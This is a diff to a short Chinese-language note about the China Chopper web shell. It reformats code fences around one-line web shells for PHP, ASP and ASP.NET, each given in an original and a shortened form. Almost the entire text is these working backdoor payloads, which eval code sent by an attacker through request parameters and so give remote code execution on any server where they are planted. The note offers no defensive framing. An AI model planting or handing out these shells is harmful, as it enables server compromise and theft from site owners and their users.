@@ -1,6 +1,7 @@
 菜刀readme.txt中附带一3个一句话： 
 
-```PHP:    <?php @eval($_POST['chopper']);?> 
+```
+PHP:    <?php @eval($_POST['chopper']);?> 
 ASP:    <%eval request("chopper")%> 
 ASP.NET:    <%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>
 ```
@@ -9,20 +10,22 @@ ASP.NET:    <%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe"
 如： 
 PHP我们可以这样写： 
 
-```
+```php
 <?php @eval($_POST['0']);?>   原版 
 <?=eval($_POST[0]);?>         缩小版
 ```
 
 ASP我们可以这样写： 
-```
+
+```asp
 <%eval request("0")%>   原版 
 <%eval request(0)%>     缩小版
 ```
 
 ASP.NET可以这样写： 
 
-```<%@ Page Language="Jscript"%><%eval(Request.Item["z"],"unsafe");%>   原版 
+```aspx
+<%@ Page Language="Jscript"%><%eval(Request.Item["z"],"unsafe");%>   原版 
 <%@Page Language=JS%><%eval(Request.Item(0),"unsafe");%>             缩小版
 ```
 
